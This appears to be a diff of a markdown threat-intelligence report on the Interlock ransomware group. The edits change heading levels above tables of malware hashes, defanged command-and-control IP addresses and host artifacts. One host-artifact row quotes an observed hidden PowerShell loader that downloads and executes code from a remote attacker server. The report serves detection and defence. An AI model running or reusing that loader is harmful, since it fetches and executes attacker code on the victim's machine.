@@ -78,11 +78,11 @@ Interlock attacks **businesses and critical infrastructure sectors** in North Am
 ### Continuous Monitoring
 - Watch for the following **IOCs**:
 
-### Indicators of Compromise
+## Indicators of Compromise
 
-## Malware Hashes
+### Malware Hashes
 
-### Table View
+#### Table View
 | Malware Name | Hash Type | File Hash | Details | First Reported | Source |
 |--------------|-----------|-----------|---------|----------------|--------|
 | dodgy.js     | SHA-256   | 2acaa9856ee58537c06cc2858fd71b860f53219504e6756faa3812019b5df5a6 | – | 2025-02-21 | Arctic Wolf |
@@ -120,9 +120,9 @@ e40e82b77019edca06c7760b6133c6cc481d9a22585dd80bce393f0bfbe47a99
 0dd67fa3129acbf191eeb683fb164074cc1ba5d7bce286e0cc5ad47cc0bbcef0
 b28a9062100a7fbf0f65dbb23db319717c4e613e890d0a3f1ae27ec6e34cf35a
 ```
-## Network Artifacts
+### Network Artifacts
 
-### Table View
+#### Table View
 | Network Artifact | Details | Intrusion Phase | First Reported | Source |
 |------------------|---------|-----------------|----------------|--------|
 | 168.119.96[.]41  | Backdoor C2 | Command and Control | 2025-02-25 | Arctic Wolf |
@@ -166,9 +166,9 @@ b28a9062100a7fbf0f65dbb23db319717c4e613e890d0a3f1ae27ec6e34cf35a
 
 ---
 
-## System Artifacts
+### System Artifacts
 
-### Table View
+#### Table View
 | Host Artifact | Details | Source |
 |---------------|---------|--------|
 | `PowerShell.exe -w h -c "iex $(irm 138[.]199.156[.]22:8080/$($z = [datetime]::UtcNow; $y = ([datetime]('01/01/' + '1970')); $x = ($z – $y).TotalSeconds; $w = [math]::Floor($x); $v = $w – ($w % 16); [int64]$v))"` | Observed PowerShell C2 loader | Arctic Wolf |
